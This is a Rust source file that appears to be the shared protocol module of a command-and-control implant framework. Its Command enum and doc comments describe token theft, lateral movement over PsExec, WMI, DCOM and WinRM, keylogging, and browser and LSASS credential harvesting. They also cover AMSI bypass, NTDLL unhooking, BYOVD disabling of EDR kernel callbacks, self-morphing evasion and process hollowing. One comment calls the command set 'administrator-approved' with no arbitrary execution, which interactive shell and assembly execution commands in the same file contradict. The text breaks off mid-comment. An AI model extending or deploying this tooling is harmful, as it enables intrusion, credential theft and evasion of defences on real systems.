//! Shared protocol, error, and cryptographic primitives for the
//! console <-> agent channel.

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use thiserror::Error;
use zeroize::Zeroize;

/// Length in bytes of the AES-256 key used by [`CryptoSession`].
pub const KEY_LEN: usize = 32;
/// Length in bytes of the HKDF salt prepended to each encrypted message.
pub const SALT_LEN: usize = 32;
/// Length in bytes of the AES-GCM nonce prepended to each ciphertext.
pub const NONCE_LEN: usize = 12;

/// Wire-protocol version for the agent ↔ server channel.
///
/// Bump this whenever a breaking change is made to the [`Message`] encoding or
/// the connection-establishment sequence.  The agent sends a
/// [`Message::VersionHandshake`] as its first message and refuses to proceed
/// if the server's echo carries a different version.
///
/// Version 2 prefixes encrypted payloads with a per-session HKDF salt:
/// `salt(32) || nonce(12) || ciphertext_with_tag`.
pub const PROTOCOL_VERSION: u32 = 2;

/// Minimum wire-protocol version the server will accept from an agent.
///
/// Agents advertising a version lower than this are rejected during the
/// `VersionHandshake`.  Bump this when dropping support for legacy agents.
pub const MIN_PROTOCOL_VERSION: u32 = 2;

/// Maximum wire-protocol version the server supports.
///
/// When an agent advertises a version higher than this, the server responds
/// with this value, signalling the highest version it can support.  The agent
/// MUST downgrade or disconnect if it cannot operate at this version.
pub const MAX_PROTOCOL_VERSION: u32 = 2;

/// Determine the negotiated protocol version given the peer's offered version.
///
/// Returns `Some(version)` if a compatible version exists in the
/// `[MIN_PROTOCOL_VERSION, MAX_PROTOCOL_VERSION]` range, or `None` if the
/// peer's version is too old to be supported.
///
/// # Negotiation rule
/// - If `offered < MIN` → incompatible (`None`).
/// - If `offered` is within `[MIN, MAX]` → use `offered`.
/// - If `offered > MAX` → use `MAX` (server's highest supported).
pub fn negotiate_protocol_version(offered: u32) -> Option<u32> {
    if offered < MIN_PROTOCOL_VERSION {
        return None;
    }
    Some(offered.min(MAX_PROTOCOL_VERSION))
}

/// Audit event logging for operator actions and agent state changes.
pub mod audit;
/// Agent and server configuration structures (TOML deserialization).
pub mod config;
/// X25519 forward-secrecy key exchange for session establishment.
pub mod forward_secrecy;
/// Centralised HKDF info/salt constants for domain-separated key derivation.
pub mod hkdf_info;
/// Indicator-of-compromise detection and reporting.
pub mod ioc;
/// Poison-resilient Mutex / RwLock helpers.
pub mod lock;
/// Malleable C2 profile types shared between agent and server.
pub mod malleable_types;
/// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
pub mod normalized_transport;
/// P2P mesh protocol message types and link management.
pub mod p2p_proto;
/// TLS transport configuration and certificate handling.
pub mod tls_transport;

pub use audit::{AuditEvent, Outcome};

/// Top-level wire message exchanged between a console and an agent.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// First message exchanged on every new connection.
    ///
    /// The agent sends this before the registration [`Heartbeat`]; the server
    /// echoes back its own version.  Either side SHOULD log a warning and MAY
    /// close the connection when the received version differs from
    /// [`PROTOCOL_VERSION`].
    VersionHandshake {
        version: u32,
    },
    Heartbeat {
        timestamp: u64,
        agent_id: String,
        status: String,
        /// Ed25519 public key used for P2P mesh certificate binding.
        /// When `None`, the server falls back to PSK-only mode and issues
        /// a certificate with an all-zeros public key (logged as a warning).
        #[serde(default)]
        mesh_public_key: Option<[u8; 32]>,
    },
    TaskRequest {
        task_id: String,
        command: Command,
        /// Identity of the operator who issued the command. Populated by the
        /// Control Center from the authenticated API session; agents use it
        /// to attribute `AuditEvent` records rather than defaulting to
        /// `"admin"`.  `None` means the request came directly from a
        /// console without an operator identity (e.g. integration tests).
        #[serde(default)]
        operator_id: Option<String>,
    },
    TaskResponse {
        task_id: String,
        result: Result<String, String>,
        /// Optional binary result data from `ExecutePluginBinary`.
        /// `None` for all other command responses.
        #[serde(default)]
        result_data: Option<Vec<u8>>,
    },
    /// Push a signed, AES-GCM-encrypted capability module to the agent.
    /// `encrypted_blob` is the same wire format produced by
    /// `CryptoSession::encrypt`.
    ModulePush {
        module_name: String,
        version: String,
        encrypted_blob: Vec<u8>,
    },
    /// Agent reports the SHA-256 hash of its `.text` section after a morph
    /// operation.  Sent both in response to `MorphNow` (carried in
    /// `TaskResponse.result`) and proactively after the initial check-in
    /// morph triggered by the server-supplied seed.
    MorphResult {
        connection_id: String,
        text_hash: String,
    },
    AuditLog(AuditEvent),
    Shutdown,
    /// Agent requests a capability module by ID.  The server locates the
    /// module file on disk, signs and encrypts it, and replies with a
    /// [`ModuleResponse`].  This replaces the legacy direct-HTTP download
    /// path (`reqwest::get`) so that module transfer is tunnelled through
    /// the encrypted C2 channel.
    ModuleRequest {
        module_id: String,
    },
    /// Server delivers a signed, AES-GCM-encrypted module to the agent in
    /// response to a [`ModuleRequest`].  The `encrypted_blob` has the same
    /// wire format as [`ModulePush::encrypted_blob`] and can be fed directly
    /// to `module_loader::load_plugin`.
    ModuleResponse {
        module_id: String,
        encrypted_blob: Vec<u8>,
    },
    /// P2P mesh: a parent agent forwards C2 traffic on behalf of a child.
    ///
    /// `child_link_id` identifies the originating child in the parent's link
    /// table so the server can route the response back to the correct child.
    /// `data` is the **plaintext** C2 payload (e.g. a serialized
    /// `TaskResponse`) that the child intended for the server.  The C2
    /// transport layer encrypts the entire `Message` (including this variant)
    /// with the parent's AES-256-GCM session key before transmission, so
    /// `data` is encrypted in transit without requiring a separate encryption
    /// step.
    P2pForward {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh: the server sends C2 traffic addressed to a specific child
    /// through its parent.  The parent looks up `child_link_id` in its link
    /// table, re-encrypts `data` with the child's per-link ChaCha20-Poly1305
    /// key, and forwards it as a `DataForward` P2P frame.
    P2pToChild {
        child_link_id: u32,
        data: Vec<u8>,
    },
    /// P2P mesh topology report.  Sent periodically by each agent to its
    /// parent (or directly to the server if the agent has no parent).
    /// Contains the agent's current set of child links so the server can
    /// maintain a full mesh topology map.
    P2pTopologyReport {
        agent_id: String,
        children: Vec<P2pChildInfo>,
    },
    /// P2P mesh link failure report.  Sent by an agent to the server when
    /// a P2P link transitions to `Dead` state.  Contains quality metrics
    /// captured at the time of failure for server-side mesh monitoring.
    P2pLinkFailureReport {
        agent_id: String,
        dead_peer_id: String,
        link_type: u8,
        uptime_secs: u64,
        latency_ms: u32,
        packet_loss: f32,
        bandwidth_bps: u64,
    },
    /// Enhanced P2P mesh topology report.  Sent every 120 seconds by each
    /// agent, includes all connected peers (parent/child/lateral) with
    /// link quality metrics and a routing table summary.
    P2pEnhancedTopologyReport {
        agent_id: String,
        /// All connected peers with link type and quality.
        peers: Vec<P2pPeerInfo>,
        /// Reachable destinations with hop counts.
        routes: Vec<P2pRouteInfo>,
    },
    /// A mesh-routed frame exceeded the maximum relay depth.  Sent by
    /// the detecting agent back toward the origin (or server).
    P2pRouteTooDeep {
        destination: String,
        origin: String,
        hop_count: u8,
    },
    /// Server delivers a mesh certificate to the agent during check-in or
    /// renewal.  The agent stores this certificate and presents it during
    /// every P2P link handshake.
    MeshCertificateIssuance {
        certificate: MeshCertificate,
    },
    /// Agent requests a mesh certificate renewal from the server (typically
    /// 2 hours before expiry).
    MeshCertificateRenewal,
    /// Server broadcasts a certificate revocation to all agents.  Every agent
    /// checks its active links and terminates any connection to the revoked peer.
    MeshCertificateRevocation {
        revoked_agent_id_hash: [u8; 32],
    },
    /// Agent reports to the server that a peer has been quarantined due to
    /// suspicious behaviour (invalid cert, compromise indicators, etc.).
    MeshQuarantineReport {
        quarantined_agent_id_hash: [u8; 32],
        reason: u8,
        evidence_hash: [u8; 32],
    },
    /// Interactive shell output — an asynchronous event sent by the agent's
    /// background reader thread whenever a shell session produces stdout or
    /// stderr data.  Unlike `TaskResponse`, this is not correlated to a
    /// specific task ID; it streams continuously until the shell session
    /// is closed.  The server forwards these events to the operator's
    /// console in real-time.
    ShellOutput {
        /// The session that produced this output.
        session_id: u32,
        /// UTF-8 text (lossy-decoded from raw bytes).
        data: String,
        /// Which stream the data came from.
        stream: ShellStream,
    },
}

/// Which stream a [`Message::ShellOutput`] event came from.
#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum ShellStream {
    /// Standard output.
    Stdout = 0,
    /// Standard error.
    Stderr = 1,
}

/// Metadata returned when a shell session is created or listed.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ShellInfo {
    /// Unique session identifier (monotonically increasing).
    pub session_id: u32,
    /// Shell type (e.g. "cmd.exe", "/bin/sh").
    pub shell_type: String,
    /// Epoch timestamp (seconds) when the session was created.
    pub created_at: u64,
    /// Process ID of the child shell.
    pub pid: u32,
}

/// A single child entry in a [`Message::P2pTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pChildInfo {
    pub link_id: u32,
    pub agent_id: String,
}

/// A single peer entry in a [`Message::P2pEnhancedTopologyReport`].
/// Contains the peer's agent_id, link type, quality score, and latency.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pPeerInfo {
    pub peer_id: String,
    /// 0=parent, 1=child, 2=peer (lateral).
    pub link_type: u8,
    /// Composite quality score (0.0–1.0).
    pub quality: f32,
    /// Last measured latency in milliseconds.
    pub latency_ms: u32,
}

/// A routing summary entry in a [`Message::P2pEnhancedTopologyReport`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct P2pRouteInfo {
    pub destination: String,
    pub hop_count: u8,
}

/// A mesh certificate issued by the server, used for P2P link
/// authentication.  Each agent receives a certificate during check-in and
/// presents it during the P2P handshake.  The Ed25519 signature is computed
/// over the concatenation:
///
/// ```text
/// agent_id_hash(32) || public_key(32) || issued_at_le(8) || expires_at_le(8)
/// ```
///
/// Optional compartment tag restricts peer links to agents in the same
/// compartment.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct MeshCertificate {
    /// SHA-256 hash of the agent's `agent_id` string (used for revocation
    /// lookups without revealing the plaintext ID on the wire).
    pub agent_id_hash: [u8; 32],
    /// The agent's long-term Ed25519 public key for link authentication.
    pub public_key: [u8; 32],
    /// Unix timestamp (seconds) when the certificate was issued.
    pub issued_at: u64,
    /// Unix timestamp (seconds) when the certificate expires.
    pub expires_at: u64,
    /// Ed25519 signature over the certificate body, produced by the server's
    /// `module_signing_key`.
    #[serde(
        serialize_with = "serialize_sig_64",
        deserialize_with = "deserialize_sig_64"
    )]
    pub server_signature: [u8; 64],
    /// Optional mesh compartment identifier.  When set, the agent may only
    /// establish peer links with agents in the same compartment.
    #[serde(default)]
    pub compartment: Option<String>,
}

/// Serde helper: serialize a 64-byte Ed25519 signature as a byte array.
fn serialize_sig_64<S: serde::Serializer>(sig: &[u8; 64], s: S) -> Result<S::Ok, S::Error> {
    s.serialize_bytes(sig)
}

/// Serde helper: deserialize a 64-byte Ed25519 signature from a byte array.
fn deserialize_sig_64<'de, D: serde::Deserializer<'de>>(d: D) -> Result<[u8; 64], D::Error> {
    struct SigVisitor;
    impl<'de> serde::de::Visitor<'de> for SigVisitor {
        type Value = [u8; 64];
        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
            f.write_str("a 64-byte signature")
        }
        fn visit_bytes<E: serde::de::Error>(self, v: &[u8]) -> Result<Self::Value, E> {
            v.try_into().map_err(|_| E::invalid_length(v.len(), &self))
        }
        fn visit_seq<A: serde::de::SeqAccess<'de>>(
            self,
            mut seq: A,
        ) -> Result<Self::Value, A::Error> {
            let mut buf = [0u8; 64];
            for (i, slot) in buf.iter_mut().enumerate() {
                *slot = seq
                    .next_element()?
                    .ok_or_else(|| serde::de::Error::invalid_length(i, &self))?;
            }
            Ok(buf)
        }
    }
    d.deserialize_bytes(SigVisitor)
}

impl MeshCertificate {
    /// Return the canonical byte buffer that is signed / verified:
    /// `agent_id_hash || public_key || issued_at_le || expires_at_le`.
    pub fn signing_input(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(32 + 32 + 8 + 8);
        buf.extend_from_slice(&self.agent_id_hash);
        buf.extend_from_slice(&self.public_key);
        buf.extend_from_slice(&self.issued_at.to_le_bytes());
        buf.extend_from_slice(&self.expires_at.to_le_bytes());
        buf
    }

    /// Check whether the certificate has expired relative to `now` (Unix ts).
    pub fn is_expired(&self, now: u64) -> bool {
        now >= self.expires_at
    }

    /// Check whether the certificate is within the renewal window.
    pub fn needs_renewal(&self, now: u64) -> bool {
        let renewal_threshold = self
            .expires_at
            .saturating_sub(crate::p2p_proto::MESH_CERT_RENEWAL_SECS);
        now >= renewal_threshold
    }
}

/// Compute the SHA-256 hash of an agent_id string (used for revocation and
/// certificate identity).
pub fn hash_agent_id(agent_id: &str) -> [u8; 32] {
    use sha2::Digest;
    let mut hasher = Sha256::new();
    hasher.update(agent_id.as_bytes());
    hasher.finalize().into()
}

/// Verify a mesh certificate's Ed25519 signature and expiry.
///
/// Returns `Ok(())` if the signature is valid and the certificate has not
/// expired relative to `now` (Unix timestamp in seconds).  Returns `Err`
/// with a human-readable description otherwise.
///
/// This function is only available when the `module-signatures` feature is
/// enabled (which pulls in `ed25519-dalek`).
#[cfg(feature = "module-signatures")]
pub fn verify_mesh_certificate(
    cert: &MeshCertificate,
    server_public_key: &[u8; 32],
    now: u64,
) -> Result<(), String> {
    use ed25519_dalek::{Signature, Verifier, VerifyingKey};

    // Check expiry first.
    if cert.is_expired(now) {
        return Err("mesh certificate has expired".to_string());
    }

    // Verify the agent_id_hash matches — this is a sanity check ensuring
    // the cert struct is internally consistent.
    // (The caller typically already knows the agent_id and can verify separately.)

    // Reconstruct the Ed25519 verifying key from bytes.
    let verifying_key = VerifyingKey::from_bytes(server_public_key)
        .map_err(|e| format!("invalid server public key: {e}"))?;

    // Reconstruct the signature from bytes.
    let signature = Signature::from_bytes(&cert.server_signature);

    // Verify the signature over the canonical signing input.
    verifying_key
        .verify(&cert.signing_input(), &signature)
        .map_err(|e| format!("mesh certificate signature verification failed: {e}"))?;

    Ok(())
}

/// Configuration for export forwarding in a side-loaded DLL.
///
/// Used by both build-time tools (e.g. `side-load-gen`) to generate
/// DLLs with legitimate-looking export tables, and at runtime by the agent's
/// `inject_with_export_forwarding` path to perform OPSEC-safe injection that
/// produces a side-loaded DLL with a legitimate export table in memory.
#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq)]
pub struct ExportConfig {
    /// Name of the real DLL to forward exports to (e.g. `"version.dll"`).
    pub forward_target: String,
    /// Named exports to forward (e.g. `["GetFileVersionInfoA"]`).
    pub named_exports: Vec<String>,
    /// Ordinal-only exports: `(ordinal, internal_name)`.
    pub ordinal_exports: Vec<(u16, String)>,
}

/// A single sandbox/VM detection indicator produced by the scoring pipeline.
///
/// Each indicator represents one piece of evidence gathered during the
/// sandbox detection sweep.  Indicators carry a weight that is summed to
/// produce the overall sandbox score.
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct SandboxIndicator {
    /// High-level category of the indicator (e.g. `"hypervisor"`,
    /// `"cloud_bios"`, `"timing"`, `"debugger"`, `"mac_prefix"`).
    pub category: String,
    /// Human-readable description of what was detected (e.g.
    /// `"VMware BIOS detected"`).
    pub detail: String,
    /// Weight contributed to the overall sandbox score.  Higher weights
    /// indicate stronger signals.
    pub weight: u32,
    /// How the indicator was obtained (e.g. `"registry"`, `"cpuid"`,
    /// `"mac_prefix"`, `"timing"`, `"peb"`).
    pub source: String,
}

/// The set of administrator-approved actions the agent is willing to perform.
///
/// The protocol intentionally does **not** expose an "execute arbitrary shell
/// Helper for serde default on `bool` fields that should default to `true`.
fn default_true() -> bool {
    true
}

/// command" variant. Scripts must be pre-registered on the endpoint and are
/// referenced by name via [`Command::RunApprovedScript`].
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Ping,
    GetSystemInfo,
    /// Run a script that has been pre-registered with the agent. `script` is
    /// the registered identifier, **not** an arbitrary command line.
    RunApprovedScript {
        script: String,
    },
    ListDirectory {
        path: String,
    },
    ReadFile {
        path: String,
    },
    WriteFile {
        path: String,
        content: Vec<u8>,
    },
    DeployModule {
        module_id: String,
    },
    ExecutePlugin {
        plugin_id: String,
        args: String,
    },
    Shutdown,
    DiscoverNetwork,
    /// Full network discovery suite (P3-01).  The operation enum selects
    /// one of the five discovery functions in `net_discovery`.
    NetworkDiscovery {
        operation: NetDiscoveryOp,
    },
    CaptureScreen,
    SimulateKey {
        key: String,
    },
    SimulateMouse {
        x: i32,
        y: i32,
    },
    StartHciLogging,
    StopHciLogging,
    GetHciLogBuffer,
    ReloadConfig,
    /// Install the opt-in persistence service (systemd unit / scheduled task).
    EnablePersistence,
    /// Remove the persistence service installed by `EnablePersistence`.
    DisablePersistence,
    /// Move the agent into the address space of `target_pid` for load
    /// balancing or resource consolidation.
    MigrateAgent {
        target_pid: u32,
    },
    /// Return a JSON-serialized snapshot of running processes.
    ListProcesses,
    /// Set the seed used for periodic self-re-encoding of the agent's own
    /// `.text` section.  The seed is combined with a timestamp to derive a
    /// unique transformation on each re-encoding pass.  Only effective when
    /// the `self-reencode` feature is compiled in.
    SetReencodeSeed {
        seed: u64,
    },
    /// Immediately re-encode the agent's `.text` section with the supplied
    /// seed and report a SHA-256 hash of the new `.text` section back to
    /// the server.  Unlike `SetReencodeSeed` (which only stores the seed for
    /// the next periodic cycle), `MorphNow` triggers a synchronous
    /// transformation and returns the resulting hash in the `TaskResponse`.
    MorphNow {
        seed: u64,
    },
    /// Switch the sleep obfuscation variant at runtime.  Accepted values:
    /// `"cronus"` (waitable-timer-based) or `"ekko"` (NtDelayExecution-based).
    /// The change takes effect on the next sleep cycle.
    SetSleepVariant {
        variant: String,
    },
    /// Return a JSON array of metadata for all loaded plugins.
    ListPlugins,
    /// Remove a plugin from the loaded-plugin registry and release its resources.
    UnloadPlugin {
        plugin_id: String,
    },
    /// Return the full `PluginMetadata` for a specific loaded plugin.
    GetPluginInfo {
        plugin_id: String,
    },
    /// Download a module from the configured `module_repo_url` or a specified
    /// URL, store it in the cache directory, and optionally load it.
    DownloadModule {
        module_id: String,
        repo_url: Option<String>,
    },
    /// Execute a loaded plugin using the binary I/O path.  Returns raw bytes
    /// via `TaskResponse.result_data`.
    ExecutePluginBinary {
        plugin_id: String,
        input_data: Vec<u8>,
    },
    /// Query the status of an asynchronous plugin job.
    JobStatus {
        job_id: String,
    },

    // ── Token Manipulation (Windows only) ───────────────────────────────
    /// Create a new logon session with the provided credentials.
    /// Returns the new session's token handle information on success.
    MakeToken {
        username: String,
        password: String,
        domain: String,
        logon_type: u32,
    },
    /// Duplicate an existing process token via `OpenProcessToken` +
    /// `DuplicateTokenEx` and begin impersonating it.
    StealToken {
        target_pid: u32,
    },
    /// Revert to the original process token (undo `StealToken` / `MakeToken`).
    Rev2Self,
    /// Elevate to SYSTEM privileges via token impersonation (steal from a
    /// SYSTEM-owned process such as `winlogon.exe` or `lsass.exe`).
    GetSystem,

    // ── Lateral Movement (Windows only) ─────────────────────────────────
    /// Execute a command on a remote host via PsExec-style service creation.
    PsExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WMI `IWbemServices`.
    WmiExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via DCOM (`ShellWindows` /
    /// `ShellBrowserWindow` COM object).
    DcomExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    /// Execute a command on a remote host via WinRM SOAP requests.
    WinRmExec {
        target_host: String,
        command: String,
        username: Option<String>,
        password: Option<String>,
    },
    // ── P2P mesh management ────────────────────────────────────────────────
    /// Instruct a child agent to establish a P2P link to a parent agent.
    LinkAgents {
        parent_agent_id: String,
        child_agent_id: String,
        /// Transport to use: `"smb"` or `"tcp"`.
        transport: String,
        /// Target address for TCP links (host:port).  Ignored for SMB.
        #[serde(default)]
        target_addr: String,
    },
    /// Instruct an agent to disconnect from its P2P parent.
    UnlinkAgent {
        agent_id: String,
    },
    /// Return the full P2P mesh topology visible to this agent.
    ListTopology,
    // ── Agent-side P2P link management ─────────────────────────────────────
    /// Connect to a parent agent at the given address using the specified
    /// transport (`"tcp"` or `"smb"`).
    LinkTo {
        parent_addr: String,
        transport: String,
    },
    /// Disconnect from a P2P link.  `None` means disconnect from all links.
    Unlink {
        link_id: Option<u32>,
    },
    /// Report the current P2P links on this agent.
    ListLinks,
    // ── Mesh controller commands ───────────────────────────────────────────
    /// Tell agent A to establish a peer link with agent B.
    MeshConnect {
        target_agent_id: String,
        transport: String,
        target_addr: String,
    },
    /// Tell agent A to close its link with agent B.
    MeshDisconnect {
        target_agent_id: String,
    },
    /// Emergency kill switch: terminate ALL P2P links immediately, purge the
    /// mesh routing table, and refuse new links until cleared.  Sent by the
    /// server when a severe compromise is detected.
    MeshKillSwitch,
    /// Operator-initiated quarantine: the agent must immediately terminate
    /// any link to the specified peer, mark it as quarantined, and refuse
    /// future connections from it.
    MeshQuarantine {
        target_agent_id: String,
        /// Reason code (see `common::p2p_proto::quarantine_reason`).
        reason: u8,
    },
    /// Clear the quarantine flag for an agent, allowing it to reconnect.
    MeshClearQuarantine {
        target_agent_id: String,
    },
    /// Set or change the mesh compartment for this agent.  Affects which
    /// peers are allowed for new link establishment.
    MeshSetCompartment {
        compartment: String,
    },

    // ── In-process .NET assembly execution (Windows only) ──────────────────
    /// Load and execute a .NET assembly entirely in-process using the CLR
    /// hosting APIs (ICLRMetaHost → ICLRRuntimeHost).  Equivalent to
    /// Cobalt Strike's `execute-assembly`.  The assembly bytes must be a
    /// valid .NET PE (managed DLL or EXE).  Output is captured via pipe
    /// redirection and returned as UTF-8 text.
    ExecuteAssembly {
        /// Raw bytes of the .NET assembly (PE/COFF with CLR header).
        data: Vec<u8>,
        /// Command-line arguments passed to the assembly entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the assembly does
        /// not return within this period the CLR thread is terminated.
        /// `None` means use a default (30 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── BOF / COFF loader (Windows only) ───────────────────────────────────
    /// Execute a Beacon Object File (BOF) / COFF object file in-process.
    /// Compatible with the public BOF ecosystem (trustedsec, CCob, etc.).
    /// The COFF bytes must contain a `go` entry-point symbol.  External
    /// symbols are resolved via the Beacon-compatible API (`DLL$Function`
    /// pattern).  Output is captured via the BeaconOutput callback and
    /// returned as UTF-8 text.
    ExecuteBOF {
        /// Raw bytes of the COFF object file (`.o` / `.obj`).
        data: Vec<u8>,
        /// Arguments packed as length-prefixed blobs and passed to the
        /// `go(char* args, int len)` entry point.
        #[serde(default)]
        args: Vec<String>,
        /// Optional wall-clock timeout in seconds.  If the BOF does not
        /// return within this period the execution thread is terminated.
        /// `None` means use a default (60 s).
        #[serde(default)]
        timeout_secs: Option<u64>,
    },

    // ── Interactive shell sessions ──────────────────────────────────────
    /// Create a new interactive shell session.  Spawns a child process
    /// (cmd.exe, /bin/sh, or a custom shell) with piped stdin/stdout/stderr.
    /// A background reader thread streams output asynchronously via
    /// [`Message::ShellOutput`].
    CreateShell {
        /// Optional path to the shell binary.  `None` uses the platform
        /// default (`cmd.exe` on Windows, `/bin/sh` on Unix).
        #[serde(default)]
        shell_path: Option<String>,
    },
    /// Send input to an active shell session's stdin pipe.
    ShellInput {
        /// The session to send input to.
        session_id: u32,
        /// The text to write.  A newline is appended automatically if not
        /// present.
        data: String,
    },
    /// Close and clean up a shell session (terminate process, close pipes,
    /// stop reader thread).
    ShellClose {
        /// The session to close.
        session_id: u32,
    },
    /// List all active shell sessions with their metadata.
    ShellList,
    /// Resize the pseudo-terminal for a shell session (no-op on Windows
    /// cmd.exe; sets TTY window size on Unix).
    ShellResize {
        /// The session to resize.
        session_id: u32,
        /// Terminal width in columns.
        cols: u16,
        /// Terminal height in rows.
        rows: u16,
    },

    // ── Surveillance ────────────────────────────────────────────────────
    /// Capture a screenshot of the specified monitor (or primary if `None`).
    /// Returns base64-encoded PNG bytes in the task response.
    Screenshot {
        /// Monitor index.  `None` captures the primary display.
        #[serde(default)]
        monitor: Option<u32>,
    },
    /// Start the keylogger.  Keystrokes are buffered in an encrypted ring
    /// buffer and can be retrieved with `KeyloggerDump`.
    KeyloggerStart,
    /// Dump the encrypted keylogger buffer.  Returns `nonce(12) || ciphertext`
    /// containing the recorded keystroke entries.
    KeyloggerDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the keylogger and release the keyboard hook.
    KeyloggerStop,
    /// Start monitoring the clipboard for changes.  Clipboard content
    /// snapshots are buffered in an encrypted ring buffer.
    ClipboardMonitorStart {
        /// Polling interval in milliseconds.  `None` uses the default (1 000 ms).
        #[serde(default)]
        interval_ms: Option<u64>,
    },
    /// Dump the encrypted clipboard monitor buffer.
    ClipboardMonitorDump {
        /// If true, clear the buffer after reading.
        #[serde(default)]
        clear: bool,
    },
    /// Stop the clipboard monitor.
    ClipboardMonitorStop,
    /// Perform a one-shot clipboard read.  Returns the current clipboard
    /// text as a UTF-8 string.
    ClipboardGet,

    // ── Browser stored-data recovery (Windows) ─────────────────────────
    /// Recover stored credentials and/or cookies from installed browsers.
    /// Windows-only; handled by the `browser-data` feature.
    /// Returns a JSON-encoded `BrowserDataResult` in the response payload.
    BrowserData {
        /// Which browser(s) to target.  `None` defaults to `BrowserType::All`.
        #[serde(default)]
        browser: Option<BrowserType>,
        /// Which data category to collect.
        data_type: BrowserDataType,
    },

    // ── LSASS credential harvesting (Windows only) ──────────────────────
    /// Harvest credentials from LSASS process memory via incremental reading
    /// and in-process parsing.  No dump file is created on disk.  Returns a
    /// JSON-encoded credential list containing MSV (NT hashes), WDigest
    /// (plaintext), Kerberos tickets, DPAPI backup keys, and DCC2 hashes.
    HarvestLSASS,

    // ── LSA Whisperer — SSP interface credential extraction (Windows) ─
    /// Extract credentials by interacting with LSA authentication packages
    /// (SSPs) through their documented interfaces.  Operates entirely within
    /// the LSA process's own security context without reading LSASS memory.
    /// Bypasses Credential Guard and RunAsPPL.  Three methods:
    /// - `Untrusted`: LsaConnectUntrusted (no admin required)
    /// - `SspInject`: Inject custom SSP to capture future logons (admin)
    /// - `Auto`: Try SspInject if elevated, else Untrusted
    HarvestLSA {
        method: LsaMethod,
    },

    /// Return a JSON status snapshot of the LSA Whisperer subsystem:
    /// active method, credentials buffered, SSP injection state, etc.
    LSAWhispererStatus,

    /// Stop the LSA Whisperer: cancel any in-progress SSP enumeration,
    /// unload injected SSP (if any), and clear the credential buffer.
    LSAWhispererStop,

    // ── NTDLL unhooking (Windows) ──────────────────────────────────────
    /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
    /// and overlay the .text section onto the in-memory (potentially hooked)
    /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
    /// syscall stubs are hooked).  Also callable on-demand by the operator.
    UnhookNtdll,

    // ── AMSI bypass mode selection (Windows) ───────────────────────────
    /// Switch the active AMSI bypass strategy at runtime.  The agent will
    /// disable any running bypass and activate the selected one.
    AmsiBypassMode {
        mode: AmsiBypassMode,
    },

    // ── Evanesco continuous memory hiding (Windows) ────────────────────
    /// Return a JSON status snapshot of the Evanesco page-tracker subsystem:
    /// number of tracked pages, current counts by state (encrypted / decrypted),
    /// idle threshold, scan interval, and total encrypt/decrypt call counts.
    /// Only available when the `evanesco` feature is compiled in.
    EvanescoStatus,
    /// Dynamically adjust the idle threshold (in milliseconds) for the
    /// Evanesco background re-encryption thread.  Pages idle longer than
    /// this value are re-encrypted to `PAGE_NOACCESS`.
    EvanescoSetThreshold {
        idle_ms: u64,
    },

    // ── Kernel callback overwrite (BYOVD, Windows only) ───────────────
    /// Discover and report all registered EDR kernel callbacks: process
    /// creation, thread creation, image load, and object manager callbacks.
    /// Returns a JSON array of discovered callbacks with module, address,
    /// and callback block information.
    KernelCallbackScan,

    /// Deploy a vulnerable signed driver (BYOVD), locate EDR kernel callbacks,
    /// and surgically overwrite their function pointers to point to a `ret`
    /// instruction.  The pointer remains non-NULL, defeating EDR integrity
    /// checks, but the callback immediately returns without executing.
    /// Optional `drivers` list restricts which vulnerable drivers to attempt;
    /// empty vector means try all embedded drivers.
    KernelCallbackNuke {
        #[serde(default)]
        drivers: Vec<String>,
    },

    /// Restore all previously overwritten kernel callback pointers to their
    /// original values (from the saved backup).  Requires a prior successful
    /// `KernelCallbackNuke` operation in the current session.
    KernelCallbackRestore,

    // ── EDR bypass transformation engine ────────────────────────────────
    /// Scan the agent's own `.text` section for byte signatures known to be
    /// detected by EDR (YARA rules, entropy heuristics, known gadget chains
    /// like direct syscall stubs).  Returns a JSON array of `SignatureHit`
    /// objects describing each detected pattern with offset, signature name,
    /// and surrounding context bytes.
    EvasionTransformScan,

    /// Run one cycle of the automated EDR bypass transformation engine.
    /// Scans `.text` for known signatures and applies up to
    /// `max_transforms_per_cycle` semantic-preserving transformations
    /// (instruction substitution, register reassignment, nop sled insertion,
    /// constant splitting, jump obfuscation).  Returns a JSON summary of
    /// applied transforms with before/after hashes for verification.
    EvasionTransformRun,

    /// Perform NTFS transaction-based process hollowing injection.
    /// Creates an NTFS transaction, creates a section backed by the
    /// transaction, writes the payload into a suspended target process,
    /// then rolls back the transaction so the on-disk file never existed.
    /// The section mapping in the target process remains valid.
    /// Includes ETW blinding with spoofed provider GUIDs.
    /// Returns `InjectionResult` on success.
    TransactedHollow {
        /// Process name to inject into (e.g. `"svchost.exe"`).
        target_process: String,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Whether to perform ETW blinding before injection.
        etw_blinding: bool,
    },

    /// Process Doppelganging injection via NTFS transactions.
    ///
    /// Creates an NTFS transaction, writes the payload into a transacted
